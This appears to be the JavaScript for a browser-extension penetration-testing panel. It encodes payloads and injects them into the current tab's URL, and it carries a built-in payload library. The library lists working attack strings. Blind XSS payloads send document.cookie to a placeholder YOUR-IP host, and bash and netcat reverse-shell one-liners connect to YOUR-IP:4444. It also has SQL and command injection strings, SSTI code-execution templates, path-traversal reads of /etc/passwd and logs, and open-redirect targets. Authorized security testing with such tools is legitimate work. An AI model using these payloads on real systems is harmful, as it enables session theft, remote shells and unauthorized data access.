document.addEventListener("DOMContentLoaded", () => {

  const payload = document.getElementById("payload");
  const injectBtn = document.getElementById("injectBtn");
  const bypass = document.getElementById("bypass");
  const urlCodeBtn = document.getElementById("urlCode");
  const base64Btn = document.getElementById("base64");
  const hexCodeBtn = document.getElementById("hexCode");
  const modeBox = document.getElementById("modeBox");
  const typeBox = document.getElementById("typeBox");
  const payloadBox = document.getElementById("payloadBox");
  const htmlcodebtn=document.getElementById("htmlcode")

  /*this is special feature hacked from vs code  */
  /* ---------- AUTO WRAP SELECTION ---------- */
  payload.addEventListener("keydown", (e) => {
    const pairs = {
      "'": "'",
      '"': '"',
      '`': '`',
      '(': ')',
                           '[': ']',
                           '{': '}'
    };

    if (pairs[e.key]) {
      let s = payload.selectionStart, eEnd = payload.selectionEnd;

      // Only wrap if there is an actual selection
      if (s !== eEnd) {
        e.preventDefault(); // Stop the character from being typed normally

        const selectedText = payload.value.slice(s, eEnd);
        const wrapperOpen = e.key;
        const wrapperClose = pairs[e.key];

        const newValue = payload.value.slice(0, s) +
        wrapperOpen + selectedText + wrapperClose +
        payload.value.slice(eEnd);

        payload.value = newValue;

        // Restore selection to include the new wrappers
        payload.selectionStart = s;
        payload.selectionEnd = eEnd + 2;

        autoGrow(payload);
      }
    }
  });

  /* ---------- AUTO GROW ---------- */
  function updateHighlighting() {
    const highlightLayer = document.getElementById("highlighting");
    let text = payload.value;

    // Basic regex for VS Code colors
    text = text
    .replace(/&/g, "&amp;").replace(/</g, "&lt;") // Escape
    .replace(/("(.*?)")/g, '<span class="token-string">$1</span>') // Double quotes
    .replace(/('(.*?)')/g, '<span class="token-string">$1</span>') // Single quotes
    .replace(/\b(alert|script|window|document|fetch|eval|UNION|SELECT|OR|FROM)\b/gi, '<span class="token-keyword">$1</span>') // Keywords
    .replace(/(&lt;[^&]+&gt;)/g, '<span class="token-tag">$1</span>'); // Tags

    highlightLayer.innerHTML = text + "\n"; // The newline keeps alignment perfect
  }

  // Inside your existing autoGrow function, add the update:
  function autoGrow(el) {
    el.style.height = "auto";
    el.style.height = el.scrollHeight + "px";
    document.getElementById("highlighting").style.height = el.style.height; // Keep heights in sync
    updateHighlighting();
  }
  payload.addEventListener("input", () => autoGrow(payload));

  /* ---------- SAFE COPY ---------- */
  function copyText(text) {
    const t = document.createElement("textarea");
    t.value = text;
    document.body.appendChild(t);
    t.select();
    document.execCommand("copy");
    document.body.removeChild(t);
  }

  /* ---------- INJECT ---------- */
  /* ---------- REFINED INJECT ---------- */
  /* ---------- REFINED INJECT ---------- */
  /* ---------- REFINED INJECT ---------- */
  let isInjecting = false;
  let lastInjectionTime = 0;
  const MIN_INJECTION_INTERVAL = 500; // Minimum 500ms between injections
  let pendingPayload = null;
  let injectionTimer = null;

  injectBtn.onclick = async () => {
    const p = payload.value.trim();
    if (!p) return;

    // Clear any pending payload from previous sessions
    if (pendingPayload) {
      console.log("Clearing previous pending payload:", pendingPayload);
      pendingPayload = null;
    }

    // Clear any existing timer
    if (injectionTimer) {
      clearTimeout(injectionTimer);
      injectionTimer = null;
    }

    // Prevent multiple rapid injections
    if (isInjecting) {
      console.log("Already injecting, setting as pending:", p);
      pendingPayload = p;

      // Auto-clear pending after 2 seconds to prevent hanging
      injectionTimer = setTimeout(() => {
        if (pendingPayload) {
          console.log("Auto-clearing stale pending payload");
          pendingPayload = null;
        }
      }, 2000);

      return;
    }

    // Rate limiting
    const now = Date.now();
    if (now - lastInjectionTime < MIN_INJECTION_INTERVAL) {
      console.log("Rate limited, waiting...");
      setTimeout(() => processInjection(p), MIN_INJECTION_INTERVAL - (now - lastInjectionTime));
      return;
    }

    await processInjection(p);
  };

  async function processInjection(p) {
    // Clear any pending state before starting new injection
    if (injectionTimer) {
      clearTimeout(injectionTimer);
      injectionTimer = null;
    }

    isInjecting = true;
    copyText(p);

    try {
      // Method 1: Try using executeScript with a unique identifier to avoid caching
      try {
        const tabs = await browser.tabs.query({ active: true, currentWindow: true });
        if (tabs && tabs[0]) {
          const tabId = tabs[0].id;

          // Add a timestamp to break any caching
          const timestamp = Date.now();

          await browser.tabs.executeScript(tabId, {
            code: `
            (function() {
              // Add a small random delay to avoid conflicts
              const delay = Math.random() * 50;

              setTimeout(() => {
                try {
                  const payload = ${JSON.stringify(p)};
                  const currentUrl = window.location.href;

                  // Build URL function
                  const buildUrl = (currentUrl, payload) => {
                    const hashIndex = currentUrl.indexOf('#');
                    const hash = hashIndex !== -1 ? currentUrl.slice(hashIndex) : '';
                    const urlWithoutHash = hashIndex !== -1 ? currentUrl.slice(0, hashIndex) : currentUrl;

                    const queryIndex = urlWithoutHash.indexOf('?');
                    const baseUrl = queryIndex !== -1 ? urlWithoutHash.slice(0, queryIndex) : urlWithoutHash;
                    const queryString = queryIndex !== -1 ? urlWithoutHash.slice(queryIndex + 1) : '';

                    if (payload.startsWith('#')) {
                      return baseUrl + (queryString ? '?' + queryString : '') + payload;
                    }
                    else if (payload.startsWith('?')) {
                      return baseUrl + payload + hash;
                    }
                    else if (payload.startsWith('&')) {
                      if (queryString) {
                        return baseUrl + '?' + queryString + payload + hash;
                      } else {
                        return baseUrl + '?' + payload.slice(1) + hash;
                      }
                    }
                    else if (queryString) {
                      const params = queryString.split('&');
                      if (params.length > 0) {
                        const firstParam = params[0].split('=')[0];
                        params[0] = firstParam + '=' + payload;
                        return baseUrl + '?' + params.join('&') + hash;
                      } else {
                        return baseUrl + '?param=' + payload + hash;
                      }
                    }
                    else {
                      return baseUrl + '?param=' + payload + hash;
                    }
                  };

                  const finalUrl = buildUrl(currentUrl, payload);

                  if (finalUrl) {
                    // Check if we're actually changing the URL
                    if (finalUrl !== currentUrl) {
                      // Use replace instead of href to avoid history stack issues
                      window.location.replace(finalUrl);
                      return { success: true, url: finalUrl };
                    } else {
                      return { success: true, message: 'URL unchanged' };
                    }
                  }
                  return { success: false, error: "Failed to build URL" };
                } catch (e) {
                  return { success: false, error: e.toString() };
                }
              }, delay);

              return { success: true, message: 'Injection queued' };
            })();
            `,
            runAt: 'document_end'
          });

          console.log("Injection attempted via tabs.executeScript");

          // Update last injection time
          lastInjectionTime = Date.now();

          // Auto-clear queue: ignore any pending payload
          if (pendingPayload) {
            console.log("Auto-clearing pending payload after successful injection:", pendingPayload);
            pendingPayload = null;
          }

          // Reset injecting flag after a delay
          setTimeout(() => {
            isInjecting = false;
            console.log("Ready for next injection");
          }, MIN_INJECTION_INTERVAL);

          return;
        }
      } catch (tabError) {
        console.log("Tab execution failed:", tabError);
      }

      // Method 2: Use devtools.inspectedWindow.eval with navigation detection
      const [result, error] = await browser.devtools.inspectedWindow.eval(`
      (function() {
        return new Promise((resolve) => {
          try {
            const payload = ${JSON.stringify(p)};
            const currentUrl = window.location.href;

            // Build URL
            const buildUrl = (currentUrl, payload) => {
              const hashIndex = currentUrl.indexOf('#');
              const hash = hashIndex !== -1 ? currentUrl.slice(hashIndex) : '';
              const urlWithoutHash = hashIndex !== -1 ? currentUrl.slice(0, hashIndex) : currentUrl;

              const queryIndex = urlWithoutHash.indexOf('?');
              const baseUrl = queryIndex !== -1 ? urlWithoutHash.slice(0, queryIndex) : urlWithoutHash;
              const queryString = queryIndex !== -1 ? urlWithoutHash.slice(queryIndex + 1) : '';

              if (payload.startsWith('#')) {
                return baseUrl + (queryString ? '?' + queryString : '') + payload;
              }
              else if (payload.startsWith('?')) {
                return baseUrl + payload + hash;
              }
              else if (payload.startsWith('&')) {
                if (queryString) {
                  return baseUrl + '?' + queryString + payload + hash;
                } else {
                  return baseUrl + '?' + payload.slice(1) + hash;
                }
              }
              else if (queryString) {
                const params = queryString.split('&');
                if (params.length > 0) {
                  const firstParam = params[0].split('=')[0];
                  params[0] = firstParam + '=' + payload;
                  return baseUrl + '?' + params.join('&') + hash;
                } else {
                  return baseUrl + '?param=' + payload + hash;
                }
              }
              else {
                return baseUrl + '?param=' + payload + hash;
              }
            };

            const finalUrl = buildUrl(currentUrl, payload);

            if (finalUrl && finalUrl !== currentUrl) {
              // Set up a one-time navigation handler
              const navigationHandler = () => {
                resolve({ success: true, url: finalUrl, navigated: true });
              };

              window.addEventListener('beforeunload', navigationHandler, { once: true });

              // Trigger navigation
              window.location.href = finalUrl;

              // Fallback timeout in case navigation doesn't trigger beforeunload
              setTimeout(() => {
                window.removeEventListener('beforeunload', navigationHandler);
                resolve({ success: true, url: finalUrl, navigated: false });
              }, 100);
            } else {
              resolve({ success: true, url: finalUrl, message: 'URL unchanged' });
            }
          } catch (e) {
            resolve({ success: false, error: e.toString() });
          }
        });
      })();
      `);

      if (error) {
        console.error("DevTools eval error:", error);
      } else if (result && result.success) {
        console.log("Injection result:", result);
      }

      lastInjectionTime = Date.now();

      // Auto-clear queue: ignore any pending payload
      if (pendingPayload) {
        console.log("Auto-clearing pending payload after injection:", pendingPayload);
        pendingPayload = null;
      }

    } catch (e) {
      console.error("Injection failed:", e);

      // Show user-friendly message
      showTemporaryMessage('Injection failed. Try refreshing the page.', 'error');

      // Still clear pending on failure to prevent getting stuck
      pendingPayload = null;
    } finally {
      // Reset injecting flag after minimum interval
      setTimeout(() => {
        isInjecting = false;

        // Double-check pending is cleared
        if (pendingPayload) {
          console.log("Auto-clearing any remaining pending payload");
          pendingPayload = null;
        }

        console.log("Ready for next injection");
      }, MIN_INJECTION_INTERVAL);
    }
  }

  // Helper function to show temporary messages
  function showTemporaryMessage(text, type = 'info') {
    const msgDiv = document.createElement('div');
    msgDiv.style.cssText = `
    position: fixed;
    bottom: 10px;
    right: 10px;
    padding: 8px 12px;
    border-radius: 4px;
    color: white;
    font-size: 12px;
    z-index: 9999;
    ${type === 'error' ? 'background: #f44336;' : 'background: #4caf50;'}
    `;
    msgDiv.textContent = text;
    document.body.appendChild(msgDiv);
    setTimeout(() => msgDiv.remove(), 2000);
  }


  /*-----------html encode toogle--------- */
  let htmlToggle = false;

  htmlcodebtn.onclick = () => transform(s => {

    const encode = str =>
    str
    .replace(/&/g, "&#x26;")
    .replace(/</g, "&#x3C;")
    .replace(/>/g, "&#x3E;")
    .replace(/"/g, "&#x22;")
    .replace(/'/g, "&#x27;")
    .replace(/\//g, "&#x2F;")
    .replace(/=/g, "&#x3D;")
    .replace(/`/g, "&#x60;");

    const decode = str =>
    str
    .replace(/&#x60;/gi, "`")
    .replace(/&#x3D;/gi, "=")
    .replace(/&#x2F;/gi, "/")
    .replace(/&#x27;/gi, "'")
    .replace(/&#x22;/gi, '"')
    .replace(/&#x3E;/gi, ">")
    .replace(/&#x3C;/gi, "<")
    .replace(/&#x26;/gi, "&");

    htmlToggle = !htmlToggle;
    return htmlToggle ? encode(s) : decode(s);

  });



  /* ---------- SELECTION TRANSFORM ---------- */
  function transform(fn) {
    let s = payload.selectionStart, e = payload.selectionEnd;
    if (s === e) return;
    const out = fn(payload.value.slice(s, e));
    payload.value = payload.value.slice(0, s) + out + payload.value.slice(e);
    payload.selectionStart = s;
    payload.selectionEnd = s + out.length;
    autoGrow(payload);
  }

  /* ---------- URL TOGGLE ---------- */
  urlCodeBtn.onclick = () => transform(s => {
    if (/%[0-9A-Fa-f]{2}/.test(s)) {
      try {
        let d = s;
        while (d.includes('%')) {
          let n = decodeURIComponent(d);
          if (n === d) break;
          d = n;
        }
        return d;
      } catch { return s; }
    }
    return s.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('').toUpperCase();
  });

  /* ---------- BASE64 TOGGLE ---------- */
  base64Btn.onclick = () => transform(s => {
    const b64Regex = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/;
    if (b64Regex.test(s) && s.length > 3) {
      try { return decodeURIComponent(escape(atob(s))); } catch { }
    }
    return btoa(unescape(encodeURIComponent(s)));
  });

  /* ---------- HEX TOGGLE ---------- */
  hexCodeBtn.onclick = () => transform(s => {
    const isHex = /^[0-9A-Fa-f\s]+$/.test(s) && s.length % 2 === 0;
    if (isHex) {
      try {
        const clean = s.replace(/\s+/g, '');
        let res = '';
        for (let i = 0; i < clean.length; i += 2) {
          res += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
        }
        return res;
      } catch { }
    }
    return s.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
  });

  /* ---------- BYPASS ---------- */
  ["'", '"', '`', '\\', '/', '<', '>', '#', ';', '|', '&', '&&', '||',
  '%00', '%0a', '%0d', '%09', '%20', '$()', '${}', '%3c', '%3e', '/">'
  ].forEach(c => {
    const b = document.createElement("span");
    b.className = "badge bypass";
    b.textContent = c;
    b.onclick = () => copyText(c);
    bypass.appendChild(b);
  });

  /* ---------- PAYLOAD DATABASE ---------- */
  const PAYLOAD_DB = {
    xss: {
      basic: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>"],
                          blind: ["<script src=http://YOUR-IP/x.js></script>", "<img src=x onerror=this.src='http://YOUR-IP/?c='+document.cookie>", "<svg/onload=fetch('http://YOUR-IP/'+btoa(document.cookie))>"],
                          dom: ["\";alert(1);//", "';alert(1);//", "javascript:alert(1)", "#<img src=x onerror=alert(1)>", "data:text/html,<svg/onload=alert(1)>"],
                          filter: ["<scr<script>ipt>alert(1)</scr<script>ipt>", "<svg><script>alert(1)</script></svg>", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"]
    },
    sqli: {
      basic: ["' OR '1'='1'-- -", "' OR 1=1-- -", "\" OR \"1\"=\"1\"-- -"],
      union: ["' UNION SELECT 1,2,3-- -", "' UNION SELECT null,null-- -","' ORDER BY 2 #"],
      error: ["' AND updatexml(1,concat(0x7e,user()),1)-- -", "' AND extractvalue(1,concat(0x7e,version()))-- -"],
                          time: ["' AND sleep(5)-- -", "' OR IF(1=1,sleep(5),0)-- -"]
    },
    cmd: {
      basic: [";id", "|id", "$(id)", "`id`"],
                          read: [";cat /etc/passwd", ";ls -la /", "|whoami"],
                          blind: [";sleep 5", "|ping -c 5 127.0.0.1"],
                          reverse: ["bash -i >& /dev/tcp/YOUR-IP/4444 0>&1", "nc YOUR-IP 4444 -e /bin/bash"]
    },
    ssti: {
      basic: ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
      rce: ["{{self.__init__.__globals__.os.popen('id').read()}}", "{{cycler.__init__.__globals__.os.popen('whoami').read()}}"]
    },
    lfi: {
      basic: ["../../../../../etc/passwd", "../../../../proc/self/environ", "/etc/passwd%00"],
      log: ["../../../../var/log/nginx/access.log", "../../../../var/log/apache2/access.log"]
    },
    redirect: {
      basic: ["//evil.com", "https://evil.com", "/\\evil.com"]
    }
  };

  /* ---------- RENDER LOGIC ---------- */
  function renderTypes(m) {
    typeBox.innerHTML = "";
    payloadBox.innerHTML = "";
    Object.keys(PAYLOAD_DB[m]).forEach((t, i) => {
      const b = document.createElement("span");
      b.className = "badge type";
      b.textContent = t;
      if (i === 0) b.classList.add("active");
      b.onclick = () => {
        typeBox.querySelectorAll(".badge.type").forEach(x => x.classList.remove("active"));
        b.classList.add("active");
        renderPayloads(m, t);
      };
      typeBox.appendChild(b);
    });
  }

  function renderPayloads(m, t) {
    payloadBox.innerHTML = "";
    PAYLOAD_DB[m][t].forEach(p => {
      const d = document.createElement("div");
      d.className = "badge payload";
      d.textContent = p;
      d.onclick = () => {
        payload.value = p;
        autoGrow(payload);
        updateHighlighting();
        copyText(p);
      };
      payloadBox.appendChild(d);
    });
  }

  Object.keys(PAYLOAD_DB).forEach((m, i) => {
    const b = document.createElement("span");
    b.className = "badge mode";
    b.dataset.mode = m;
    b.textContent = m.toUpperCase();
    if (i === 0) b.classList.add("active");
    b.onclick = () => {
      modeBox.querySelectorAll(".badge.mode").forEach(x => x.classList.remove("active"));
      b.classList.add("active");
      renderTypes(m);
    };
    modeBox.appendChild(b);
    if (i === 0) renderTypes(m);
  });
});
